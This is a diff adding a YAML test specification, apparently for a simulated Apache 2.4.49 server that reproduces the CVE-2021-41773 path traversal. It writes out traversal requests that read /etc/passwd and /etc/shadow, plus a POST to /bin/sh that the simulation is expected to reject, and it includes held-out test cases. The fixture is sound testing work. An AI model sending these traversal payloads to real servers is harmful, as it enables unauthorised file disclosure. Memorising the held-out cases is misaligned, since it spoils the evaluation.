@@ -1,0 +1,61 @@
+schema_version: 1
+id: apache-2021-41773
+http_version: "1.1"
+references: [https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-41773]
+cases:
+  - id: normal-pages-and-unknown-route
+    steps:
+      - path: /
+        expect:
+          status: 200
+          body: "<!doctype html><title>Build archive</title><h1>Build archive</h1>\n"
+          headers: [[server, Apache/2.4.49], [content-type, text/html]]
+      - path: /missing
+        expect: {status: 404, body: "Not found\n"}
+      - path: /cgi-bin/status.txt
+        expect: {status: 200, body: "Archive service ready\n"}
+  - id: published-single-encoded-traversal
+    concurrent: 4
+    repeat: 2
+    steps:
+      - path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+        expect:
+          status: 200
+          body: "root:x:0:0:root:/root:/bin/bash\narchive:x:1001:1001:Archive Service:/srv/archive:/usr/sbin/nologin\n"
+          headers: [[server, Apache/2.4.49], [content-type, text/plain]]
+  - id: protected-configuration
+    overrides:
+      behaviors:
+        - id: apache-traversal
+          kind: apache-2021-41773
+          options: {protected: true}
+    steps:
+      - path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+        expect: {status: 403, body: "Forbidden\n"}
+  - id: undeclared-files-are-not-disclosed
+    steps:
+      - path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow
+        expect: {status: 404, body: "Not found\n"}
+      - path: /etc/passwd
+        expect: {status: 404, body: "Not found\n"}
+  - id: follow-on-double-encoding-is-excluded
+    steps:
+      - path: /cgi-bin/.%252e/.%252e/.%252e/.%252e/etc/passwd
+        expect: {status: 400, body: "Bad request\n"}
+  - id: cgi-execution-is-excluded
+    steps:
+      - path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+        method: POST
+        body: echo should-never-execute
+        expect: {status: 405, headers: [[allow, "GET, HEAD"]]}
+  - id: upper-case-encoding-and-query
+    group: held_out
+    steps:
+      - path: /cgi-bin/.%2E/.%2E/.%2E/.%2E/etc/passwd?source=archive
+        expect: {status: 200, contains: "archive:x:1001:"}
+  - id: head-uses-same-file-without-a-body
+    group: held_out
+    steps:
+      - path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+        method: HEAD
+        expect: {status: 200, body: ""}
